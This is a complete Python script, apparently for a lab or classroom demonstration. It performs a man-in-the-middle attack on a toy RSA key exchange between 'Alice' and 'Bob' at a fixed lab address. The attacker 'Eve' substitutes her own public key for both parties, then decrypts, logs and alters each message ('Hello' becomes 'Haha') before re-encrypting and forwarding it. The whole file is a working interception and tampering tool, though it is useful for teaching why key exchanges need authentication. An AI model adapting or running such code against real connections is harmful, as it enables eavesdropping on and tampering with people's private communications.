import socket
import time
import os
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

# --- Eve's Configuration ---
EVE_LISTEN_PORT = 12345  # Port Alice connects to
BOB_IP = "172.20.0.3"
BOB_PORT = 12345
KEY_SIZE = 2048
PUBLIC_EXPONENT = 65537

# --- Utility Functions ---
def generate_keys():
    private_key = rsa.generate_private_key(
        public_exponent=PUBLIC_EXPONENT, key_size=KEY_SIZE
    )
    return private_key, private_key.public_key()

def serialize_key(public_key):
    return public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

def deserialize_key(key_bytes):
    return serialization.load_pem_public_key(key_bytes)

def encrypt(message, public_key):
    return public_key.encrypt(
        message.encode(),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

def decrypt(ciphertext, private_key):
    try:
        return private_key.decrypt(
            ciphertext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        ).decode()
    except Exception:
        return "DECRYPTION_FAILED"

def print_intercept(actor, original_sender, original_receiver, message):
    print("\n--------------------------------------------------")
    print(f"    [EVE] *** INTERCEPTED MESSAGE ***")
    print(f"    [EVE] Actor: {actor}")
    print(f"    [EVE] Original Sender: {original_sender}")
    print(f"    [EVE] Original Receiver: {original_receiver}")
    print(f"    [EVE] Decrypted Content: '{message}'")
    print("--------------------------------------------------\n")

# --- Main Attack Logic ---
def main():
    print("[EVE] Starting the Man-in-the-Middle attack proxy...")
    eve_private_key, eve_public_key = generate_keys()
    print("[EVE] Generated my own RSA key pair.")

    # =================================================================
    # Part 1: Act as a server for Alice
    # =================================================================
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("", EVE_LISTEN_PORT))
    server_socket.listen()
    print(f"[EVE] Listening for Alice on port {EVE_LISTEN_PORT}...")
    alice_conn, alice_addr = server_socket.accept()
    print(f"[EVE] Alice connected from {alice_addr}.")

    # =================================================================
    # Part 2: Act as a client to Bob
    # =================================================================
    bob_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    time.sleep(2) # Give Bob a moment
    print(f"[EVE] Connecting to Bob at {BOB_IP}:{BOB_PORT}...")
    bob_socket.connect((BOB_IP, BOB_PORT))
    print("[EVE] Connected to Bob.")

    # =================================================================
    # Part 3: The Deceptive Key Exchange
    # =================================================================
    print("\n[EVE] --- Starting Deceptive Key Exchange ---")

    # Get Alice's real public key
    alice_public_key_bytes = alice_conn.recv(2048)
    alice_public_key = deserialize_key(alice_public_key_bytes)
    print("[EVE] Received Alice's real public key.")

    # Get Bob's real public key
    bob_socket.sendall(serialize_key(eve_public_key)) # Send EVE's key to Bob
    bob_public_key_bytes = bob_socket.recv(2048)
    bob_public_key = deserialize_key(bob_public_key_bytes)
    print("[EVE] Received Bob's real public key.")
    print("[EVE] Sent my (Eve's) public key to Bob.")

    # Send Eve's public key to Alice
    alice_conn.sendall(serialize_key(eve_public_key))
    print("[EVE] Sent my (Eve's) public key to Alice.")
    print("[EVE] --- Deceptive Key Exchange Complete ---\n")

    # =================================================================
    # Part 4: The Interception Loop
    # =================================================================
    while True:
        # --- Forward message from Alice to Bob ---
        encrypted_from_alice = alice_conn.recv(2048)
        if not encrypted_from_alice: break
        
        # Decrypt with Eve's key (since Alice thinks she's talking to Bob)
        decrypted_message = decrypt(encrypted_from_alice, eve_private_key)
        print_intercept("Alice", "alice", "bob", decrypted_message)

        # Modify the message
        modified_message = decrypted_message.replace("Hello", "Haha")
        print(f"[EVE] Modifying message to: '{modified_message}'")

        # Re-encrypt with Bob's REAL key and forward
        print("[EVE] Re-encrypting with Bob's real key and forwarding...")
        encrypted_for_bob = encrypt(modified_message, bob_public_key)
        bob_socket.sendall(encrypted_for_bob)

        # --- Forward acknowledgment from Bob to Alice ---
        encrypted_from_bob = bob_socket.recv(2048)
        if not encrypted_from_bob: break

        # Decrypt with Eve's key (since Bob thinks he's talking to Alice)
        decrypted_ack = decrypt(encrypted_from_bob, eve_private_key)
        print_intercept("Bob", "bob", "alice", decrypted_ack)

        # Re-encrypt with Alice's REAL key and forward
        print("[EVE] Re-encrypting with Alice's real key and forwarding...")
        encrypted_for_alice = encrypt(decrypted_ack, alice_public_key)
        alice_conn.sendall(encrypted_for_alice)

    print("[EVE] A client disconnected. Shutting down.")
    alice_conn.close()
    bob_socket.close()
    server_socket.close()

if __name__ == "__main__":
    main()
